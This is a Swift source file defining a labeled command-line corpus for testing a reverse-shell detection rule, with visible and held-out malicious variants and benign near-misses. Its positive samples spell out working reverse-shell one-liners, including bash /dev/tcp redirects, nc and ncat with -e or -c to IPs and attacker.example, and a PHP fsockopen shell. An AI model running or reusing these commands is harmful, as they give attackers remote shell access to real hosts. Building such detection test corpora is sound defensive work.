// Corpus.swift
// assessment-framework (P1): the labeled detection corpus for Lane 1 (offline
// event replay). Each sample is a command line with a ground-truth label. The
// corpus is deliberately built to measure detection ENGINEERING quality, not
// memorization (per Florian Roth): positives span multiple REPRESENTATIONS of a
// technique, split into a VISIBLE set (variants a rule author could see) and a
// HELD-OUT set (novel variants), so recall on the held-out set measures
// generalization. Negatives include near-misses that share tokens (bash, nc,
// python) but are benign — the false-positive guard.

import Foundation

/// One labeled command-line sample.
public struct LabeledSample: Sendable, Hashable {
    /// The process command line (Sigma `CommandLine` → `event.process.commandLine`).
    public let commandLine: String
    /// Ground truth: does this command line represent the technique under test?
    public let malicious: Bool
    /// A short name for the technique REPRESENTATION (obfuscation/tool variant),
    /// used to compute obfuscation coverage. Empty for negatives.
    public let representation: String
    /// If malicious: is this a HELD-OUT novel variant (true) or a VISIBLE
    /// training variant (false)? Held-out recall is the anti-memorization axis.
    public let heldOut: Bool

    public init(commandLine: String, malicious: Bool, representation: String = "", heldOut: Bool = false) {
        self.commandLine = commandLine
        self.malicious = malicious
        self.representation = representation
        self.heldOut = heldOut
    }
}

/// A labeled corpus for one technique.
public struct TechniqueCorpus: Sendable {
    public let technique: String          // e.g. "T1059.004"
    public let targetRuleId: String       // compiled-rule id expected to fire
    public let targetRuleName: String     // human title (fallback match)
    public let samples: [LabeledSample]

    public init(technique: String, targetRuleId: String, targetRuleName: String, samples: [LabeledSample]) {
        self.technique = technique
        self.targetRuleId = targetRuleId
        self.targetRuleName = targetRuleName
        self.samples = samples
    }
}

public enum Corpora {
    /// T1059.004 — reverse shell. Target: Rules/command_and_control/reverse_shell_pattern.yml.
    public static let reverseShell = TechniqueCorpus(
        technique: "T1059.004",
        targetRuleId: "d1a2b3c4-0042-4000-a000-000000000042",
        targetRuleName: "Reverse Shell Command Detected",
        samples: [
            // ── POSITIVES · VISIBLE variants (what a rule author would see) ──
            LabeledSample(commandLine: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                          malicious: true, representation: "bash-devtcp", heldOut: false),
            LabeledSample(commandLine: "nc -e /bin/sh 10.0.0.1 4444",
                          malicious: true, representation: "nc-e", heldOut: false),
            LabeledSample(commandLine: "python -c \"import socket,subprocess,os;s=socket.socket()\"",
                          malicious: true, representation: "python-c", heldOut: false),
            LabeledSample(commandLine: "php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3\");'",
                          malicious: true, representation: "php-fsockopen", heldOut: false),
            LabeledSample(commandLine: "/bin/sh -i >& /dev/tcp/192.168.1.5/9001 0>&1",
                          malicious: true, representation: "sh-devtcp", heldOut: false),

            // ── POSITIVES · HELD-OUT novel variants (generalization test) ──
            LabeledSample(commandLine: "bash -c \"bash -i >& /dev/tcp/172.16.0.9/1337 0>&1\"",
                          malicious: true, representation: "bash-c-nested", heldOut: true),
            LabeledSample(commandLine: "ncat -e /bin/bash 198.51.100.2 53",
                          malicious: true, representation: "ncat-e", heldOut: true),
            LabeledSample(commandLine: "nc -c /bin/sh attacker.example 4444",
                          malicious: true, representation: "nc-c", heldOut: true),
            LabeledSample(commandLine: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.2\",4444))'",
                          malicious: true, representation: "python3-squote", heldOut: true),

            // ── NEGATIVES · benign, incl. token-sharing near-misses (FP guard) ──
            LabeledSample(commandLine: "git commit -m \"fix reverse proxy config\"", malicious: false),
            LabeledSample(commandLine: "ls -la /usr/bin", malicious: false),
            LabeledSample(commandLine: "curl -fsSL https://example.com/install.sh", malicious: false),
            LabeledSample(commandLine: "python3 -c \"import json; print(json.dumps({}))\"", malicious: false),
            LabeledSample(commandLine: "bash -c \"echo hello && ls\"", malicious: false),
            LabeledSample(commandLine: "nc -l 8080", malicious: false),            // listener, not -e/-c
            LabeledSample(commandLine: "nc -zv example.com 443", malicious: false), // port scan, benign
            LabeledSample(commandLine: "php -v", malicious: false),
            LabeledSample(commandLine: "brew install netcat", malicious: false),
            LabeledSample(commandLine: "man bash", malicious: false),
        ]
    )
}
